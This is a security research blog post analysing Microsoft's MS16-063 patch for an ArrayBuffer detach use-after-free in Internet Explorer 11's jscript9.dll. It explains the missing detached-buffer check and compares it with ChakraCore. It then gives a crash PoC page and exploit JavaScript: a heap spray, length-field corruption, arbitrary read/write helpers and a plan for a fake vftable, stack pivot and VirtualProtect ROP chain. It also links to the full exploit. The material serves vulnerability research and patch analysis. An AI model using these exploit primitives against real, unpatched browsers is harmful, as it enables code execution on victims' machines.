---
layout: post
title: "Patch Analysis of MS16-063 (jscript9.dll)"
description: Last week, Microsoft released the MS16-063 security bulletin for their monthly Patch Tuesday (June 2016) security updates. It addressed vulnerabilities that affected Internet Explorer. Among other things, the patch fixes a memory corruption vulnerability in jscript9.dll related to TypedArray and DataView.
headline:
modified: 2016-06-27
category: research
imagefeature:
mathjax:
chart:
comments: true
featured: true
---

A couple weeks ago, Microsoft released the [MS16-063][ms16-063]{:target="_blank"} security bulletin for their monthly Patch Tuesday (June 2016) security updates. It addressed vulnerabilities that affected Internet Explorer. Among other things, the patch fixes a memory corruption vulnerability in `jscript9.dll` related to _TypedArray_ and _DataView_.

As with our previous blog post, we are going to analyze the patch, figure out the vulnerability, and construct a proof-of-concept exploit.


### Patched vs Unpatched

We begin with comparing the May and June versions of `jscript9.dll` in BinDiff:

<img src="{{ site.url }}/images/2016-06-27/bindiff_diff.png" style="display: block; margin: auto;">

Unlike [last time][vbscript-post]{:target="_blank"}, there are many changes to the binary. But if we take a closer look, most of them are related to `DirectGetItem` and `DirectSetItem` functions for various types of `TypedArray` classes. We also see some changes in `GetValue` and `SetValue` functions for the `DataView` class.

<img src="{{ site.url }}/images/2016-06-27/bindiff_diff_2.png" style="display: block; margin: auto;">

##### TypedArray & DataView

You can read more about `TypedArray` [here][typed-array]{:target="_blank"}, but it provides a mechanism for accessing raw binary data that is backed by an `ArrayBuffer`. An ArrayBuffer cannot be accessed or manipulated directly, but only through a higher-level interface called a _view_. A view provides a context that includes its type, offset, and number of elements.

With `DataView`, we get flexibility in terms of reading and writing arbitrary data in arbitrary byte-order (endianness).

With `TypedArray`, as its name suggests, we can specify the data type of the array elements to one of the following:

  - Int8Array: signed 8-bit integer
  - Uint8Array: unsigned 8-bit integer
  - Uint8ClampedArray: unsigned 8-bit clamped integer (clamps to either 0 or 255)
  - Int16Array: signed 16-bit integer
  - Uint16Array: unsigned 16-bit integer
  - Int32Array: signed 32-bit integer
  - Uint32Array: unsigned 32-bit integer
  - Float32Array: 32-bit IEEE floating point number (float)
  - Float64Array: 64-bit IEEE floating point number (double)

`TypedArray` and `DataView` are similar in some sense that both _views_ allow us to access or manipulate the raw data. So, what did the patch change in these functions?


### Analysis

It is easy to see that some code was added (red basic blocks).

<img src="{{ site.url }}/images/2016-06-27/bindiff_func.png" style="display: block; margin: auto;">
<center><strong>June vs. May</strong></center>

Before the patch, `DirectGetItem` and `DirectSetItem` for each typed array simply check the `index` is in bounds and then accesses the buffer.

<img src="{{ site.url }}/images/2016-06-27/getdirectitem_may.png" style="display: block; margin: auto;">
<center><strong>GetDirectItem (May)</strong></center>

In pseudo-code, it looks like the following:

```cpp
inline Var DirectGetItem(__in uint32 index)
{
    if (index < GetLength())
    {
        TypeName* typedBuffer = (TypeName*)buffer;
        return JavascriptNumber::ToVar(
            typedBuffer[index], GetScriptContext()
        );
    }
    return GetLibrary()->GetUndefined();
}
```

Note that there is no check on the buffer itself. Therefore, the buffer could be _detached_ before accessing/manipulating, causing a Use-After-Free vulnerability.

We can force an ArrayBuffer to become detached by transferring it using postMessage. The snippet below is sufficient to detach an ArrayBuffer referenced by `ab`:

```javascript
function detach(ab) {
    postMessage("", "*", [ab]);
}
```

The code that was added to the modified functions checks to make sure the buffer is not detached, which prevents the Use-After-Free.

<img src="{{ site.url }}/images/2016-06-27/getdirectitem_june.png" style="display: block; margin: auto;">
<center><strong>GetDirectItem (June)</strong></center>

Fun fact is that this vulnerability was already patched (likely during refactoring) in [ChakraCore][chakra]{:target="_blank"} since the [initial commit][initial-commit]{:target="_blank"} (Jan, 2016) of the code.

```cpp
// https://github.com/Microsoft/ChakraCore/blob/master/lib/Runtime/Library/TypedArray.h#L238

inline Var BaseTypedDirectGetItem(__in uint32 index)
{
    if (this->IsDetachedBuffer()) // 9.4.5.8 IntegerIndexedElementGet
    {
        JavascriptError::ThrowTypeError(GetScriptContext(), JSERR_DetachedTypedArray);
    }

    if (index < GetLength())
    {
        Assert((index + 1)* sizeof(TypeName)+GetByteOffset() <= GetArrayBuffer()->GetByteLength());
        TypeName* typedBuffer = (TypeName*)buffer;
         return JavascriptNumber::ToVar(typedBuffer[index], GetScriptContext());
    }
    return GetLibrary()->GetUndefined();
}
```

After this latest path, `jscript9` also has check for a detached buffer in both `DataView` and `TypedArray`.


### Trigger PoC

Triggering the bug is quite simple:

  1. Create a `TypedArray` -- we can choose any type, but we'll use `Int8Array` here.
  2. Detach the `ArrayBuffer` that is backing the `Int8Array` from step 1 -- this frees the buffer.
  3. Access _free'd_ buffer by getting or setting items using `Int8Array` view.

```html
<html>
  <body>
    <script>
      function pwn() {
        var ab = new ArrayBuffer(1000 * 1024);
        var ia = new Int8Array(ab);
        detach(ab);
        setTimeout(main, 50, ia);

        function detach(ab) {
          postMessage("", "*", [ab]);
        }

        function main(ia) {
          ia[100] = 0x41414141;
        }
      }
      setTimeout(pwn, 50);
    </script>
  </body>
</html>
```

Yay, crash!

<img src="{{ site.url }}/images/2016-06-27/poc_crash.png" style="display: block; margin: auto; border: 1px solid #ccc">

Specifically, with our example, it crashes while trying to write data at _FREE_ memory (i.e. `ia[100]` now points to _FREE_ memory). For a successful exploit, we want to allocate objects that we create and control their metadata to give us more powerful primitives: aribtrary memory read and write.


### Exploit

In this blog post, we are going to test and develop our exploit on Windows 7. Specifically, we will target the Internet Explorer 11 on Windows 7 from [modern.ie][modern-ie]{:target="_blank"} -- because the image they give out doesn't have this update, it is still vulnerable.

As shown in the PoC code, we first allocate an `ArrayBuffer` object that will back the `Int8Array`. We allocate a large `ArrayBuffer` (~2MB) so that the memory will be returned to the OS once it is freed. For this exploitation method, the exact size is not important.

```javascript
var ab = new ArrayBuffer(2123 * 1024);
var ia = new Int8Array(ab);
```

Once we detach the buffer and trigger the memory collector, which frees the allocated memory via _VirtualFree_, we fill in that space by allocating a **lot** of smaller objects that we want to modify.

```javascript
var ab2 = new ArrayBuffer(0x1337);
function sprayHeap() {
  for (var i = 0; i < 100000; i++) {
    arr[i] = new Uint8Array(ab2);
  }
}
```

This triggers the [LFH][lfh]{:target="_blank"} for the size class for _sizeof(Uint8Array)_, and several blocks of memory will be allocated for the LFH. The memory will be allocated through _VirtualAlloc_ and this likely returns the memory we just free'd by detaching the large buffer.

We can see this in action using [VMMap][vmmap]{:target="_blank"}:

<p style="margin-bottom: 0.1em;">
<img src="{{ site.url }}/images/2016-06-27/vmmap_0.png" style="width: 49%;"><img src="{{ site.url }}/images/2016-06-27/vmmap_1.png" style="width: 49%; float: right;">
</p>
<p>
<span style="width: 49%; display: inline-block; text-align: center; color: #666">1. Before ArrayBuffer allocation</span><span style="width: 49%; inline-block; text-align: center; color: #666; float: right;">2. After ArrayBuffer allocation (2124 KB)</span>
</p>

<p style="margin-bottom: 0.1em;">
<img src="{{ site.url }}/images/2016-06-27/vmmap_2.png" style="width: 49%;"><img src="{{ site.url }}/images/2016-06-27/vmmap_3.png" style="width: 49%; float: right;">
</p>
<p>
<span style="width: 49%; display: inline-block; text-align: center; color: #666">3. After detaching the buffer</span><span style="width: 49%; inline-block; text-align: center; color: #666; float: right;">4. After allocating Uint8Arrays (LFH)</span>
</p>

We now need to locate one of the `Uint8Array` object we have created. Since the `Uint8Array` class has a 4-byte _length_ member, we search for the length we specified for `ab2` (0x1337). Once found, we increment the length and find the corresponding array index in `arr`.

```javascript
for (var i = 0; ia[i] != 0x37 || ia[i+1] != 0x13 || ia[i+2] != 0x00 || ia[i+3] != 0x00; i++)
{
  if (ia[i] === undefined)
    return;
}

ia[i]++;
lengthIdx = i;

try {
  for (var i = 0; arr[i].length != 0x1338; i++);
} catch (e) {
  return;
}

mv = arr[i];
```

We assign this particular `Uint8Array` object to a separate variable (`mv`) that we will be using as a memory view for reading and writing arbitrary memory. Note that it is trivial to get the addresses of the buffer and vftable (for `Uint8Array`) as well:

```javascript
function ub(sb) {
  return (sb < 0) ? sb + 0x100 : sb;
}

var bufaddr = ub(ia[lengthIdx + 4]) | ub(ia[lengthIdx + 4 + 1]) << 8 | ub(ia[lengthIdx + 4 + 2]) << 16 | ub(ia[lengthIdx + 4 + 3]) << 24;
var vtable = ub(ia[lengthIdx - 0x1c]) | ub(ia[lengthIdx - 0x1b]) << 8 | ub(ia[lengthIdx - 0x1a]) << 16 | ub(ia[lengthIdx - 0x19]) << 24;
```

As usual, we write simple helper functions:

```javascript
function setAddress(addr) {
  ia[lengthIdx + 4] = addr & 0xFF;
  ia[lengthIdx + 4 + 1] = (addr >> 8) & 0xFF;
  ia[lengthIdx + 4 + 2] = (addr >> 16) & 0xFF;
  ia[lengthIdx + 4 + 3] = (addr >> 24) & 0xFF;
}

function readN(addr, n) {
  if (n != 4 && n != 8)
    return 0;
  setAddress(addr);
  var ret = 0;
  for (var i = 0; i < n; i++)
    ret |= (mv[i] << (i * 8))
  return ret;
}

function writeN(addr, val, n) {
  if (n != 2 && n != 4 && n != 8)
    return;
  setAddress(addr);
  for (var i = 0; i < n; i++)
    mv[i] = (val >> (i * 8)) & 0xFF
}
```

Okay. Now what?

There are many avenues from here and it depends on the target environment, so we will describe one possible way to get arbitrary code execution on our target (Win7 IE11). Our attack plan is the following:

  1. Calculate the base address of `jscript9` from vftable address we leaked.
  2. Construct a fake virtual function table in our heap buffer.
      * We replace the pointer to `Subarray` with the address to a stack-pivot gadget
      * `mov esp, ebx; pop ebx; ret`
      * Note: ebx is the first argument we provide to `subarray`
  3. Read `VirtualProtect` entry in import table.
  4. Construct a ROP payload that calls `VirtualProtect` on our shellcode buffer.
  5. Overwrite the vftable address of `mv` (`Uint8Array` object) with our fake one.
  6. Call _mv.subarray_ for profit!

The shellcode in the exploit just spawns _notepad.exe_.

<img src="{{ site.url }}/images/2016-06-27/poc_notepad.png" style="display: block; margin: auto; border: 1px solid #ccc">

Obviously, the process that we spawn is running as Low Integrity and needs to escape the sandbox with a separate vulnerability. We will not discuss it here, since it is out of scope of this blog post. Additional issues that we won't address are: cleaning up after the exploit to prevent IE from crashing, and improving reliability of the heap allocations.

You can find our final exploit code in our GitHub repo: [https://github.com/theori-io/jscript9-typedarray][theori-github]{:target="_blank"}

If you have some experience with the modern browser exploitation, you'll realize that this attack method does not work on Windows 8.1 and beyond due to the introduction of _Control Flow Guard (CFG)_. This is because the CFG validates indirect calls (such as virtual functions).

In the next blog post, we will talk about a method to bypass CFG and demonstrate it using the same vulnerability we have played with today.

Thanks for reading!


[ms16-063]: https://technet.microsoft.com/en-us/library/security/ms16-063.aspx
[vbscript-post]: https://github.com/theori-io/cve-2016-0189
[typed-array]: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Typed_arrays
[chakra]: https://github.com/Microsoft/ChakraCore/blob/master/lib/Runtime/Library/TypedArray.h#L238
[initial-commit]: https://github.com/Microsoft/ChakraCore/blob/5d8406741f8c60e7bf0a06e4fb71a5cf7a6458dc/lib/Runtime/Library/TypedArray.h#L226
[modern-ie]: https://developer.microsoft.com/en-us/microsoft-edge/
[lfh]: https://msdn.microsoft.com/en-us/library/windows/desktop/aa366750%28v=vs.85%29.aspx?f=255&MSPPError=-2147217396
[theori-github]: https://github.com/theori-io/jscript9-typedarray
[vmmap]: https://technet.microsoft.com/en-us/sysinternals/vmmap.aspx?f=255&MSPPError=-2147217396
